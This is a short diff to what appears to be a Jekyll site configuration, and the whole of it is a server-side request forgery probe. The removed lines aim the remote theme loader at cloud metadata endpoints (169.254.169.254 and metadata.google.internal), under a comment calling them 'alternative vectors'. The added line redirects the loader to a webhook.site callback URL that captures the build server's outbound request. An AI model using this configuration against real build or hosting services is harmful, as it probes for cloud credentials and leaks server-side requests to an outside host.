@@ -1,7 +1,3 @@
-remote_theme: http://169.254.169.254/theme
+remote_theme: https://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/jekyll-theme
 plugins:
   - jekyll-remote-theme
-
-# Alternative vectors
-data_sources:
-  metadata: http://metadata.google.internal/data
